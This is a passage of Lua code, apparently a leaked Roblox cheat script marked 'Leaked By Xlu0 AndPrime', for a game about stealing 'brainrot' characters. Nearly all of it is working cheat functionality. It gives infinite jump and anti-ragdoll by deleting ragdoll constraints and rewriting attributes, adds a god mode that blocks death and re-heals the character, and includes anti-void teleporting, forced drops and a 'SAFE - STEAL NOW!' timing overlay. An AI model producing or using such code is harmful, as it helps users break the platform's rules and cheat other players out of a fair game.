local rayResult = workspace:Raycast(currentRoot.Position, Vector3.new(0, -2000, 0), rayParams)
if rayResult then
local hum = currentChar:FindFirstChildOfClass("Humanoid")
local offset = (hum and hum.HipHeight or 2) + (currentRoot.Size.Y / 2)
currentRoot.CFrame = CFrame.new(currentRoot.Position.X, rayResult.Position.Y + offset, currentRoot.Position.Z)
currentRoot.AssemblyLinearVelocity = Vector3.zero
currentRoot.AssemblyAngularVelocity = Vector3.zero
end

_G.SoundJumpDropActive = false
return
end

local _jdCur = currentRoot.AssemblyLinearVelocity
currentRoot.AssemblyLinearVelocity = Vector3.new(
_jdCur.X,
_G.SoundJumpDropAscendSpeed,
_jdCur.Z
)
end)
end

function runDrop()
if _G.SoundDropMode == "Jump Drop" then
_G.SoundRunJumpDrop()
else
runStandDrop()
end
end

function runDropBrainrot()
runDrop()
end

local infJumpEnabled = false
local antiRagdollEnabled = false
local antiRagdollConn = nil
_G.SoundAntiRagdollMode = "Zombie Hub"

_G.SoundAntiVoidEnabled = _G.SoundAntiVoidEnabled == true
_G.SoundAntiVoidConnection = _G.SoundAntiVoidConnection or nil
_G.SoundAntiVoidSafeCFrame = _G.SoundAntiVoidSafeCFrame or nil

function _G.SoundAntiVoidSaveSafe()
    local char = LP.Character
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if not hum or not root or hum.Health <= 0 then return end
    if hum.FloorMaterial ~= Enum.Material.Air then
        _G.SoundAntiVoidSafeCFrame = root.CFrame
    end
end

function _G.SoundAntiVoidStop()
    if _G.SoundAntiVoidConnection then
        pcall(function() _G.SoundAntiVoidConnection:Disconnect() end)
        _G.SoundAntiVoidConnection = nil
    end
end

function _G.SoundAntiVoidSet(on)
    _G.SoundAntiVoidEnabled = on == true
    _G.SoundAntiVoidStop()
    if not _G.SoundAntiVoidEnabled then return end

    _G.SoundAntiVoidSaveSafe()

    _G.SoundAntiVoidConnection = RunService.Heartbeat:Connect(function()
        local char = LP.Character
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        local root = char and char:FindFirstChild("HumanoidRootPart")
        if not _G.SoundAntiVoidEnabled or not hum or not root or hum.Health <= 0 then return end

        local voidY = Workspace.FallenPartsDestroyHeight + 30
        if hum.FloorMaterial ~= Enum.Material.Air and root.Position.Y > voidY + 12 then
            _G.SoundAntiVoidSafeCFrame = root.CFrame
        elseif root.Position.Y <= voidY and _G.SoundAntiVoidSafeCFrame then
            root.AssemblyLinearVelocity = Vector3.zero
            root.AssemblyAngularVelocity = Vector3.zero
            root.CFrame = _G.SoundAntiVoidSafeCFrame + Vector3.new(0, 4, 0)
            hum.PlatformStand = false
            hum.Sit = false
            pcall(function() hum:ChangeState(Enum.HumanoidStateType.GettingUp) end)
        end
    end)
end
local unwalkEnabled = false
local unwalkSavedAnimate = nil
local hitHarderAnimEnabled = false
local hitHarderOriginalAnims = {}
local selectedAnimationPack = "OFF"

local AnimationPacks = {
["Zombie"] = {
idle = {{"rbxassetid://616158929", 1}, {"rbxassetid://616160636", 1}},
walk = "rbxassetid://616168032",
run = "rbxassetid://616163682",
jump = "rbxassetid://616161997",
fall = "rbxassetid://616157476",
climb = "rbxassetid://616156119",
swim = "rbxassetid://616165109",
swimidle = "rbxassetid://616166655",
},
["Ninja"] = {
idle = {{"rbxassetid://656117400", 1}, {"rbxassetid://656117400", 1}},
walk = "rbxassetid://656121766",
run = "rbxassetid://656118852",
jump = "rbxassetid://656117878",
fall = "rbxassetid://656115606",
climb = "rbxassetid://656114359",
},
["Knight"] = {
idle = {{"rbxassetid://657595757", 1}, {"rbxassetid://657595757", 1}},
walk = "rbxassetid://657552124",
run = "rbxassetid://657564596",
jump = "rbxassetid://658409194",
fall = "rbxassetid://657600338",
climb = "rbxassetid://658360781",
},
["Elder"] = {
idle = {{"rbxassetid://845397899", 1}, {"rbxassetid://845397899", 1}},
walk = "rbxassetid://845403856",
run = "rbxassetid://845386501",
jump = "rbxassetid://845398858",
fall = "rbxassetid://845397673",
climb = "rbxassetid://845392038",
},
["Levitate"] = {
idle = {{"rbxassetid://616006778", 1}, {"rbxassetid://616006778", 1}},
walk = "rbxassetid://616013216",
run = "rbxassetid://616013216",
jump = "rbxassetid://616008936",
fall = "rbxassetid://616005863",
climb = "rbxassetid://616003713",
},
["Astronaut"] = {
idle = {{"rbxassetid://891621366", 1}, {"rbxassetid://891621366", 1}},
walk = "rbxassetid://891636393",
run = "rbxassetid://891636393",
jump = "rbxassetid://891627522",
fall = "rbxassetid://891617961",
climb = "rbxassetid://891609353",
},
["Pirate"] = {
idle = {{"rbxassetid://750781874", 1}, {"rbxassetid://750781874", 1}},
walk = "rbxassetid://750785693",
run = "rbxassetid://750783738",
jump = "rbxassetid://750782230",
fall = "rbxassetid://750780242",
climb = "rbxassetid://750779899",
},
["Toy"] = {
idle = {{"rbxassetid://782841498", 1}, {"rbxassetid://782841498", 1}},
walk = "rbxassetid://782843345",
run = "rbxassetid://782842708",
jump = "rbxassetid://782847020",
fall = "rbxassetid://782846423",
climb = "rbxassetid://782843869",
},
["Vampire"] = {
idle = {{"rbxassetid://1083445855", 1}, {"rbxassetid://1083445855", 1}},
walk = "rbxassetid://1083473930",
run = "rbxassetid://1083462077",
jump = "rbxassetid://1083455352",
fall = "rbxassetid://1083443587",
climb = "rbxassetid://1083439238",
},
["Werewolf"] = {
idle = {{"rbxassetid://1083195517", 1}, {"rbxassetid://1083195517", 1}},
walk = "rbxassetid://1083178339",
run = "rbxassetid://1083216690",
jump = "rbxassetid://1083218792",
fall = "rbxassetid://1083189019",
climb = "rbxassetid://1083182000",
},
["Rthro"] = {
idle = {{"rbxassetid://2510196951", 1}, {"rbxassetid://2510196951", 1}},
walk = "rbxassetid://2510202577",
run = "rbxassetid://2510198475",
jump = "rbxassetid://2510197830",
fall = "rbxassetid://2510195892",
climb = "rbxassetid://2510192778",
},
["Stylish"] = {
idle = {{"rbxassetid://616136790", 1}, {"rbxassetid://616136790", 1}},
walk = "rbxassetid://616146177",
run = "rbxassetid://616140816",
jump = "rbxassetid://616139451",
fall = "rbxassetid://616134815",
climb = "rbxassetid://616133594",
},
["Amazon Unboxed"] = {
idle = {{"rbxassetid://98281136301627", 1}, {"rbxassetid://98281136301627", 1}},
walk = "rbxassetid://90478085024465",
run = "rbxassetid://134824450619865",
jump = "rbxassetid://121454505477205",
fall = "rbxassetid://94788218468396",
climb = "rbxassetid://121145883950231",
swim = "rbxassetid://105962919001086",
swimidle = "rbxassetid://129126268464847",
},
}

local AnimationPackList = {"OFF","Zombie","Ninja","Knight","Elder","Levitate","Astronaut","Pirate","Toy","Vampire","Werewolf","Rthro","Stylish","Amazon Unboxed"}
local AnimationPackIndex = 1
local OriginalAnims = {}
local animationPackValueLabel = nil
local refreshAnimationPackRow = nil

_G.SoundAnimationSystem = _G.SoundAnimationSystem or {
    conn = nil,
    original = nil,
    activePack = "OFF",
}

function _G.SoundAnimGetAnimate(char)
    char = char or LP.Character
    return char and char:FindFirstChild("Animate") or nil
end

function _G.SoundAnimReadOriginal(char)
    if _G.SoundAnimationSystem.original then return end
    local animate = _G.SoundAnimGetAnimate(char)
    if not animate then return end

    local function g(obj)
        return obj and obj.AnimationId or nil
    end

    _G.SoundAnimationSystem.original = {
        idle1 = g(animate.idle and animate.idle:FindFirstChild("Animation1")),
        idle2 = g(animate.idle and animate.idle:FindFirstChild("Animation2")),
        walk = g(animate.walk and animate.walk:FindFirstChild("WalkAnim")),
        run = g(animate.run and animate.run:FindFirstChild("RunAnim")),
        jump = g(animate.jump and animate.jump:FindFirstChild("JumpAnim")),
        fall = g(animate.fall and animate.fall:FindFirstChild("FallAnim")),
        climb = g(animate.climb and animate.climb:FindFirstChild("ClimbAnim")),
        swim = g(animate.swim and animate.swim:FindFirstChild("Swim")),
        swimidle = g(animate.swimidle and animate.swimidle:FindFirstChild("SwimIdle")),
    }
end

function _G.SoundAnimGetPack(packName)
    return AnimationPacks[packName]
end

function _G.SoundAnimApplyPack(char, packName)
    local animate = _G.SoundAnimGetAnimate(char)
    local pack = _G.SoundAnimGetPack(packName)
    if not animate or not pack then return false end

    local function s(obj, id)
        if obj and id then
            obj.AnimationId = tostring(id)
        end
    end

    s(animate.idle and animate.idle:FindFirstChild("Animation1"), pack.idle and pack.idle[1] and pack.idle[1][1])
    s(animate.idle and animate.idle:FindFirstChild("Animation2"), pack.idle and pack.idle[2] and pack.idle[2][1])
    s(animate.walk and animate.walk:FindFirstChild("WalkAnim"), pack.walk)
    s(animate.run and animate.run:FindFirstChild("RunAnim"), pack.run)
    s(animate.jump and animate.jump:FindFirstChild("JumpAnim"), pack.jump)
    s(animate.fall and animate.fall:FindFirstChild("FallAnim"), pack.fall)
    s(animate.climb and animate.climb:FindFirstChild("ClimbAnim"), pack.climb)
    s(animate.swim and animate.swim:FindFirstChild("Swim"), pack.swim)
    s(animate.swimidle and animate.swimidle:FindFirstChild("SwimIdle"), pack.swimidle)

    return true
end

function _G.SoundAnimRestore(char)
    local animate = _G.SoundAnimGetAnimate(char)
    local o = _G.SoundAnimationSystem.original
    if not animate or not o then return end

    local function s(obj,id)
        if obj and id then obj.AnimationId = id end
    end

    s(animate.idle and animate.idle:FindFirstChild("Animation1"), o.idle1)
    s(animate.idle and animate.idle:FindFirstChild("Animation2"), o.idle2)
    s(animate.walk and animate.walk:FindFirstChild("WalkAnim"), o.walk)
    s(animate.run and animate.run:FindFirstChild("RunAnim"), o.run)
    s(animate.jump and animate.jump:FindFirstChild("JumpAnim"), o.jump)
    s(animate.fall and animate.fall:FindFirstChild("FallAnim"), o.fall)
    s(animate.climb and animate.climb:FindFirstChild("ClimbAnim"), o.climb)
    s(animate.swim and animate.swim:FindFirstChild("Swim"), o.swim)
    s(animate.swimidle and animate.swimidle:FindFirstChild("SwimIdle"), o.swimidle)
end

function _G.SoundAnimStop()
    if _G.SoundAnimationSystem.conn then
        pcall(function() _G.SoundAnimationSystem.conn:Disconnect() end)
        _G.SoundAnimationSystem.conn = nil
    end

    _G.SoundAnimRestore(LP.Character)
    _G.SoundAnimationSystem.activePack = "OFF"
end

function _G.SoundAnimStart(packName)
    if packName == "OFF" then
        _G.SoundAnimStop()
        return
    end

    if _G.SoundAnimationSystem.conn then
        pcall(function() _G.SoundAnimationSystem.conn:Disconnect() end)
        _G.SoundAnimationSystem.conn = nil
    end

    local char = LP.Character
    if not char then return end

    local pack = _G.SoundAnimGetPack(packName)
    if not pack then return end

    _G.SoundAnimReadOriginal(char)
    _G.SoundAnimationSystem.activePack = packName

    --Leaked By Xlu0 AndPrime--
    task.spawn(function()
        local list = {}
        for _, v in pairs(pack) do
            if type(v) == "string" then
                table.insert(list, v)
            elseif type(v) == "table" then
                for _, a in ipairs(v) do
                    if type(a) == "table" and a[1] then
                        table.insert(list, tostring(a[1]))
                    end
                end
            end
        end
        pcall(function()
            game:GetService("ContentProvider"):PreloadAsync(list)
        end)
    end)

    _G.SoundAnimApplyPack(char, packName)

    local hum = char:FindFirstChildOfClass("Humanoid")
    if hum then
        for _, track in ipairs(hum:GetPlayingAnimationTracks()) do
            pcall(function() track:Stop(0) end)
        end
        pcall(function()
            hum:ChangeState(Enum.HumanoidStateType.Running)
        end)
    end

    --Leaked By Xlu0 AndPrime--
    _G.SoundAnimationSystem.conn = RunService.Heartbeat:Connect(function()
        if selectedAnimationPack == "OFF" then return end
        local c = LP.Character
        if c then
            _G.SoundAnimApplyPack(c, selectedAnimationPack)
        end
    end)
end

function syncAnimationPackIndex()
    local found = 1
    for i, name in ipairs(AnimationPackList) do
        if name == selectedAnimationPack then
            found = i
            break
        end
    end
    AnimationPackIndex = found
end

function applyAnimationPack(packName)
    selectedAnimationPack = packName or "OFF"
    syncAnimationPackIndex()

    if selectedAnimationPack == "OFF" then
        _G.SoundAnimStop()
    else
        _G.SoundAnimStart(selectedAnimationPack)
    end

    if refreshAnimationPackRow then
        pcall(refreshAnimationPackRow)
    end
end

--Leaked By Xlu0 AndPrime--
enableUnwalk = function()
    selectedAnimationPack = "OFF"
    _G.SoundAnimStop()
end

disableUnwalk = function()
end

enableHitHarderAnim = function()
    applyAnimationPack("Zombie")
end

disableHitHarderAnim = function()
    applyAnimationPack("OFF")
end

resetAnimations = function()
    applyAnimationPack("OFF")
end

stopCurrentAnimations = function(char)
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    if not hum then return end
    for _, track in ipairs(hum:GetPlayingAnimationTracks()) do
        pcall(function() track:Stop(0) end)
    end
end

getAnimate = function(char)
    return _G.SoundAnimGetAnimate(char)
end

setAnimId = function(obj,id)
    if obj and id then obj.AnimationId = tostring(id) end
end

reloadAnimate = function(animate)
    if not animate then return end
    pcall(function()
        animate.Disabled = true
        task.wait()
        animate.Disabled = false
    end)
end

backupAnimations = function(char)
    _G.SoundAnimReadOriginal(char)
end

LP.CharacterAdded:Connect(function(char)
    task.wait(0.5)
    _G.SoundAnimationSystem.original = nil
    if selectedAnimationPack and selectedAnimationPack ~= "OFF" then
        _G.SoundAnimStart(selectedAnimationPack)
    end
end)

--Leaked By Xlu0 AndPrime--
local antiRagdollResetCooldown = 0

local function forceAntiRagdollReset()
    local char = LP.Character
    if not char then return end

    local hum = char:FindFirstChildOfClass("Humanoid")
    local root = char:FindFirstChild("HumanoidRootPart")
    if not hum or not root or hum.Health <= 0 then return end

    pcall(function()
        hum:ChangeState(Enum.HumanoidStateType.GettingUp)
        root.AssemblyLinearVelocity = Vector3.zero
        root.AssemblyLinearVelocity = Vector3.zero
        root.AssemblyAngularVelocity = Vector3.zero

        for _, obj in ipairs(char:GetDescendants()) do
            if obj:IsA("Motor6D") then obj.Enabled = true end
            if obj:IsA("Constraint") then obj.Enabled = true end
        end

        if workspace.CurrentCamera then
            workspace.CurrentCamera.CameraSubject = hum
        end

        local playerScripts = LP:FindFirstChild("PlayerScripts")
        local playerModule = playerScripts and playerScripts:FindFirstChild("PlayerModule")
        if playerModule then
            local controlModuleObj = playerModule:FindFirstChild("ControlModule")
            if controlModuleObj then
                local ok, controls = pcall(require, controlModuleObj)
                if ok and controls and controls.Enable then
                    pcall(function() controls:Enable() end)
                end
            end
        end

        hum.AutoRotate = true
        hum.PlatformStand = false
        hum.Sit = false
    end)
end

local function startAntiRagdoll()
    if antiRagdollConn then return end
    antiRagdollEnabled = true
    antiRagdollConn = RunService.Heartbeat:Connect(function()
        if not antiRagdollEnabled then return end
        local char = LP.Character
        if not char then return end
        local hum = char:FindFirstChildOfClass("Humanoid")
        local root = char:FindFirstChild("HumanoidRootPart")
        if not hum or hum.Health <= 0 then return end
        local state = hum:GetState()
        local ragdolled = (state == Enum.HumanoidStateType.Physics
            or state == Enum.HumanoidStateType.Ragdoll
            or state == Enum.HumanoidStateType.FallingDown)
        if not root then return end
        --Leaked By Xlu0 AndPrime--
        local endTime = LP:GetAttribute("RagdollEndTime")
        if endTime and (endTime - workspace:GetServerTimeNow()) > 0 then
            ragdolled = true
        end
        if ragdolled then
            local now = tick()
            if now - (antiRagdollResetCooldown or 0) > 0.15 then
                antiRagdollResetCooldown = now
                --Leaked By Xlu0 AndPrime--
                pcall(function()
                    LP:SetAttribute("RagdollEndTime", workspace:GetServerTimeNow())
                end)
                --Leaked By Xlu0 AndPrime--
                for _, d in ipairs(char:GetDescendants()) do
                    if d:IsA("BallSocketConstraint") or
                       (d:IsA("Attachment") and d.Name:find("RagdollAttachment")) then
                        d:Destroy()
                    end
                end
                --Leaked By Xlu0 AndPrime--
                for _, obj in ipairs(char:GetDescendants()) do
                    if obj:IsA("Motor6D") and not obj.Enabled then
                        obj.Enabled = true
                    end
                end
                if hum.Health > 0 then
                    hum:ChangeState(Enum.HumanoidStateType.Running)
                end
                workspace.CurrentCamera.CameraSubject = hum
                root.Anchored = false
                root.AssemblyLinearVelocity = Vector3.zero
                root.AssemblyAngularVelocity = Vector3.zero
            end
        end
    end)
end

local function stopAntiRagdoll()
    antiRagdollEnabled = false
    if antiRagdollConn then
        antiRagdollConn:Disconnect()
        antiRagdollConn = nil
    end
end

local function setAntiRagdoll(on)
    if on then
        startAntiRagdoll()
    else
        stopAntiRagdoll()
    end
end

_G.SoundInfJumpMode = (_G.SoundInfJumpMode == "Hold") and "Hold" or "Tap"

--Leaked By Xlu0 AndPrime--
local _xIJBoosting   = false
local _xIJLastBoost  = 0
local _xIJForce      = 25
local _xIJFrames     = 2
local _xIJCooldown   = 0.12
local _xJumpHeld     = false
local _xHoldIJConn   = nil

local function _xApplyInfJumpBoost(root)
    if not root or _xIJBoosting then return end
    local now = tick()
    if now - _xIJLastBoost < _xIJCooldown then return end
    _xIJLastBoost  = now
    _xIJBoosting   = true
    local bv = Instance.new("BodyVelocity")
    bv.MaxForce = Vector3.new(0, math.huge, 0)
    bv.P        = 1250
    local cur   = root.AssemblyLinearVelocity
    bv.Velocity = Vector3.new(cur.X, _xIJForce, cur.Z)
    bv.Parent   = root
    local frames = 0
    local conn
    conn = RunService.Heartbeat:Connect(function()
        if frames < _xIJFrames then
            frames = frames + 1
            if bv and bv.Parent then
                bv.Velocity = bv.Velocity + Vector3.new(0, 0.01, 0)
            end
        else
            if bv then pcall(function() bv:Destroy() end) end
            if conn then conn:Disconnect() end
            _xIJBoosting = false
        end
    end)
end

--Leaked By Xlu0 AndPrime--
task.spawn(function()
    local pg = LP:WaitForChild("PlayerGui", 10)
    if not pg then return end
    local function hookBtn(btn)
        if btn:IsA("GuiButton") and btn.Name == "JumpButton" and not btn:GetAttribute("XluIJHooked") then
            btn:SetAttribute("XluIJHooked", true)
            btn.MouseButton1Down:Connect(function() if infJumpEnabled then _xJumpHeld = true end end)
            btn.MouseButton1Up:Connect(function()  _xJumpHeld = false end)
            btn.MouseLeave:Connect(function()      _xJumpHeld = false end)
        end
    end
    for _, d in ipairs(pg:GetDescendants()) do hookBtn(d) end
    pg.DescendantAdded:Connect(hookBtn)
end)

UserInputService.JumpRequest:Connect(function()
    if infJumpEnabled and _G.SoundInfJumpMode == "Tap" then
        _xJumpHeld = true
        task.delay(0.08, function() _xJumpHeld = false end)
    end
end)

UserInputService.InputBegan:Connect(function(inp, gpe)
    if gpe then return end
    if infJumpEnabled and inp.UserInputType == Enum.UserInputType.Keyboard and inp.KeyCode == Enum.KeyCode.Space then
        _xJumpHeld = true
    end
end)

UserInputService.InputEnded:Connect(function(inp)
    if inp.UserInputType == Enum.UserInputType.Keyboard and inp.KeyCode == Enum.KeyCode.Space then
        _xJumpHeld = false
    end
end)

--Leaked By Xlu0 AndPrime--
RunService.Heartbeat:Connect(function()
    if not infJumpEnabled or _G.SoundInfJumpMode ~= "Tap" then return end
    if not _xJumpHeld then return end
    local char = LP.Character
    if not char then return end
    local hum  = char:FindFirstChildOfClass("Humanoid")
    local root = char:FindFirstChild("HumanoidRootPart")
    if not hum or not root or hum.Health <= 0 then return end
    _xApplyInfJumpBoost(root)
end)

--Leaked By Xlu0 AndPrime--
local function _xStartHoldIJ()
    if _xHoldIJConn then _xHoldIJConn:Disconnect() end
    _xHoldIJConn = RunService.Heartbeat:Connect(function()
        if not infJumpEnabled or _G.SoundInfJumpMode ~= "Hold" then return end
        local char = LP.Character
        if not char then return end
        local root = char:FindFirstChild("HumanoidRootPart")
        local hum  = char:FindFirstChildOfClass("Humanoid")
        if not root or not hum then return end
        local held = UserInputService:IsKeyDown(Enum.KeyCode.Space) or _xJumpHeld
        local vel  = root.AssemblyLinearVelocity
        if held and vel.Y < 35 then
            root.AssemblyLinearVelocity = Vector3.new(vel.X, 55, vel.Z)
        end
        vel = root.AssemblyLinearVelocity
        if vel.Y < -120 then
            root.AssemblyLinearVelocity = Vector3.new(vel.X, -120, vel.Z)
        end
    end)
end
_xStartHoldIJ()

setInfJumpInternal = function(on)
    infJumpEnabled = on and true or false
    if not infJumpEnabled then
        _xJumpHeld   = false
        _xIJBoosting = false
    end
end

_G.SoundAntiResetEnabled = _G.SoundAntiResetEnabled == true

-- ============================================================
-- ANTI DIE (full god-mode from Green Duels V3)
-- SetStateEnabled Dead false + heal on HealthChanged + death
-- revival via Died event + BreakJoints=false hook
-- ============================================================
_G.SoundAntiDie = { enabled = false, conns = {} }

function _G.SoundApplyAntiReset()
    pcall(function()
        StarterGui:SetCore("ResetButtonCallback", false)
    end)
end

function _G.SoundRestoreReset()
    pcall(function()
        StarterGui:SetCore("ResetButtonCallback", true)
    end)
end

local function adaptApplyGodMode(character)
    if not character or not character.Parent then return end
    local humanoid = character:FindFirstChildOfClass("Humanoid") or character:WaitForChild("Humanoid", 5)
    if not humanoid then return end

    pcall(function() humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead, false) end)

    local healConn
    healConn = humanoid:GetPropertyChangedSignal("Health"):Connect(function()
        if not _G.SoundAntiDie.enabled then return end
        if humanoid.Health < humanoid.MaxHealth then
            humanoid.Health = humanoid.MaxHealth
        end
    end)
    table.insert(_G.SoundAntiDie.conns, healConn)

    local deathConn
    deathConn = humanoid.Died:Connect(function()
        if not _G.SoundAntiDie.enabled then return end
        deathConn:Disconnect()
        task.wait(0.05)
        if humanoid and humanoid.Parent then
            humanoid.Health = humanoid.MaxHealth
            humanoid:ChangeState(Enum.HumanoidStateType.Running)
            deathConn = humanoid.Died:Connect(function()
                if not _G.SoundAntiDie.enabled then return end
                task.wait(0.05)
                if humanoid and humanoid.Parent then
                    humanoid.Health = humanoid.MaxHealth
                    humanoid:ChangeState(Enum.HumanoidStateType.Running)
                end
            end)
        end
    end)
    table.insert(_G.SoundAntiDie.conns, deathConn)

    local breakConn
    pcall(function()
        breakConn = character:GetPropertyChangedSignal("BreakJoints"):Connect(function()
            if not _G.SoundAntiDie.enabled then return end
            if character.BreakJoints then character.BreakJoints = false end
        end)
    end)
    if breakConn then table.insert(_G.SoundAntiDie.conns, breakConn) end
end

function _G.SoundHookAntiDieCharacter(char)
    if not _G.SoundAntiDie.enabled then return end
    adaptApplyGodMode(char)
end

function _G.SoundSetAntiReset(on)
    _G.SoundAntiResetEnabled = on == true
    _G.SoundAntiDie.enabled = on == true

    if _G.SoundAntiResetEnabled then
        --Leaked By Xlu0 AndPrime--
        task.spawn(function()
            for _ = 1, 12 do
                if not _G.SoundAntiResetEnabled then return end
                _G.SoundApplyAntiReset()
                task.wait(0.25)
            end
        end)

        for _, c in ipairs(_G.SoundAntiDie.conns) do
            pcall(function() c:Disconnect() end)
        end
        _G.SoundAntiDie.conns = {}

        if LP.Character then
            task.spawn(function()
                task.wait(0.1)
                adaptApplyGodMode(LP.Character)
            end)
        end
    else
        for _, c in ipairs(_G.SoundAntiDie.conns) do
            pcall(function() c:Disconnect() end)
        end
        _G.SoundAntiDie.conns = {}
        _G.SoundRestoreReset()
    end
end

--Leaked By Xlu0 AndPrime--
if _G.SoundAntiDieCharConn then
    pcall(function() _G.SoundAntiDieCharConn:Disconnect() end)
end
_G.SoundAntiDieCharConn = LP.CharacterAdded:Connect(function(char)
    task.wait(0.3)
    if _G.SoundAntiDie.enabled then
        adaptApplyGodMode(char)
    end

    if _G.SoundRestoreAntiDieAfterReset then
        _G.SoundRestoreAntiDieAfterReset = false
        task.wait(0.35)
        _G.SoundSetAntiReset(true)
        if _G.SoundAntiResetVisual then
            pcall(function() _G.SoundAntiResetVisual(true) end)
        end
        if saveSoundConfig then pcall(saveSoundConfig) end
    end
end)

if LP.Character and _G.SoundAntiResetEnabled then
    task.defer(function()
        _G.SoundAntiDie.enabled = true
        adaptApplyGodMode(LP.Character)
    end)
end



-- ==================== ANTI E01 ERROR ====================
_G.SoundAntiE01Enabled = _G.SoundAntiE01Enabled == true
local _e01WasCarrying = false
local _e01CurrentUI = nil
local _e01Connection = nil
local _e01LoopThread = nil

local function _e01IsCarrying()
    local char = LP.Character
    if not char then return false end

    for _, child in pairs(char:GetChildren()) do
        local name = string.lower(child.Name)
        if name:find("brainrot") or name:find("brain") or name:find("animal") or
           name:find("carry") or name:find("stolen") or name:find("held") or name:find("steal") then
            return true
        end
    end

    for attrName, attrValue in pairs(char:GetAttributes()) do
        local name = string.lower(tostring(attrName))
        if (name:find("carrying") or name:find("carry") or name:find("stealing") or
            name:find("isstealing") or name:find("hasbrainrot")) and attrValue == true then
            return true
        end
    end

    local okSteal, stealVal = pcall(function() return LP:GetAttribute("Stealing") end)
    if okSteal and stealVal == true then return true end

    local humanoid = char:FindFirstChildOfClass("Humanoid")
    if humanoid and humanoid.WalkSpeed > 0 and humanoid.WalkSpeed <= 25 and humanoid.WalkSpeed ~= 16 then
        return true
    end

    return false
end

local function _e01CleanupUI()
    if _e01Connection then
        pcall(function() _e01Connection:Disconnect() end)
        _e01Connection = nil
    end
    if _e01CurrentUI then
        pcall(function() _e01CurrentUI:Destroy() end)
        _e01CurrentUI = nil
    end
end

local function _e01ShowCarryWarning()
    _e01CleanupUI()

    local playerGui = PlayerGui or LP:FindFirstChild("PlayerGui")
    if not playerGui then return end

    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "CarryWarningUI"
    screenGui.ResetOnSpawn = false
    screenGui.IgnoreGuiInset = true
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    if type(safeParentGui) == "function" then
        safeParentGui(screenGui)
    end
    if not screenGui.Parent then
        screenGui.Parent = playerGui
    end
    _e01CurrentUI = screenGui

    local frame = Instance.new("Frame")
    frame.Name = "WarningFrame"
    frame.Parent = screenGui
    frame.AnchorPoint = Vector2.new(0.5, 0)
    frame.Position = UDim2.new(0.5, 0, 0, -50)
    frame.Size = UDim2.new(0, 340, 0, 44)
    frame.BackgroundColor3 = Color3.fromRGB(28, 3, 8)
    frame.BackgroundTransparency = 0.05
    frame.BorderSizePixel = 0
    frame.ZIndex = 300

    local uiCorner = Instance.new("UICorner")
    uiCorner.CornerRadius = UDim.new(0, 10)
    uiCorner.Parent = frame

    local uiStroke = Instance.new("UIStroke")
    uiStroke.Parent = frame
    uiStroke.Color = Color3.fromRGB(235, 25, 55)
    uiStroke.Thickness = 2
    uiStroke.Transparency = 0.05

    local textLabel = Instance.new("TextLabel")
    textLabel.Parent = frame
    textLabel.BackgroundTransparency = 1
    textLabel.Position = UDim2.new(0, 10, 0, 4)
    textLabel.Size = UDim2.new(1, -20, 1, -8)
    textLabel.Font = Enum.Font.GothamBlack
    textLabel.TextColor3 = Color3.fromRGB(255, 225, 230)
    textLabel.TextStrokeColor3 = Color3.fromRGB(100, 0, 20)
    textLabel.TextStrokeTransparency = 0.35
    textLabel.TextScaled = false
    textLabel.TextSize = 9
    textLabel.TextWrapped = true
    textLabel.ZIndex = 301
    textLabel.Text = "3.00 SECONDS REMAINING"

    local scale = Instance.new("UIScale")
    scale.Parent = frame
    scale.Scale = 0.9

    local slideIn = TweenService:Create(
        frame,
        TweenInfo.new(0.35, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
        { Position = UDim2.new(0.5, 0, 0, 8) }
    )
    local scaleIn = TweenService:Create(
        scale,
        TweenInfo.new(0.35, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
        { Scale = 1 }
    )
    slideIn:Play()
    scaleIn:Play()

    local duration = 3.0
    local startTime = tick()
    local finished = false

    _e01Connection = RunService.RenderStepped:Connect(function()
        if finished or not frame.Parent or not _G.SoundAntiE01Enabled then
            if _e01Connection then
                pcall(function() _e01Connection:Disconnect() end)
                _e01Connection = nil
            end
            return
        end

        local elapsed = tick() - startTime
        local remaining = math.max(0, duration - elapsed)

        if remaining > 0 then
            textLabel.Text = string.format("%.2f SECONDS REMAINING", remaining)
            textLabel.TextColor3 = Color3.fromRGB(255, 200, 100)
            uiStroke.Color = Color3.fromRGB(235, 25, 55)
        else
            finished = true
            if _e01Connection then
                pcall(function() _e01Connection:Disconnect() end)
                _e01Connection = nil
            end

            textLabel.Text = "SAFE - STEAL NOW!"
            textLabel.TextColor3 = Color3.fromRGB(100, 255, 150)
            uiStroke.Color = Color3.fromRGB(0, 255, 100)

            local bounce = TweenService:Create(
                frame,
                TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
                { Size = UDim2.new(0, 360, 0, 48) }
            )
            bounce:Play()
            task.delay(0.3, function()
                if not frame or not frame.Parent then return end
                local bounceBack = TweenService:Create(
                    frame,
                    TweenInfo.new(0.2),
                    { Size = UDim2.new(0, 340, 0, 44) }
                )
                bounceBack:Play()
            end)

            task.delay(3, function()
                if not frame or not frame.Parent then return end
                local slideOut = TweenService:Create(
                    frame,
                    TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
                    {
                        Position = UDim2.new(0.5, 0, 0, -50),
                        BackgroundTransparency = 1
                    }
                )
                local fadeText = TweenService:Create(
                    textLabel,
                    TweenInfo.new(0.22, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
                    { TextTransparency = 1, TextStrokeTransparency = 1 }
                )
                slideOut:Play()
                fadeText:Play()
                slideOut.Completed:Connect(function()
                    if screenGui then
                        pcall(function() screenGui:Destroy() end)
                        if _e01CurrentUI == screenGui then
                            _e01CurrentUI = nil
                        end
                    end
                end)
            end)
        end
    end)
end

local function _e01StopLoop()
    if _e01LoopThread then
        pcall(function() task.cancel(_e01LoopThread) end)
        _e01LoopThread = nil
    end
    _e01CleanupUI()
    _e01WasCarrying = false
end

local function _e01StartLoop()
    _e01StopLoop()
    _e01LoopThread = task.spawn(function()
        while _G.SoundAntiE01Enabled do
            task.wait(0.1)
            if not _G.SoundAntiE01Enabled then break end
            local currentlyCarrying = false
            pcall(function() currentlyCarrying = _e01IsCarrying() end)
            if not _e01WasCarrying and currentlyCarrying then
                pcall(_e01ShowCarryWarning)
            end
            _e01WasCarrying = currentlyCarrying
        end
    end)
end

function _G.SoundSetAntiE01(on)
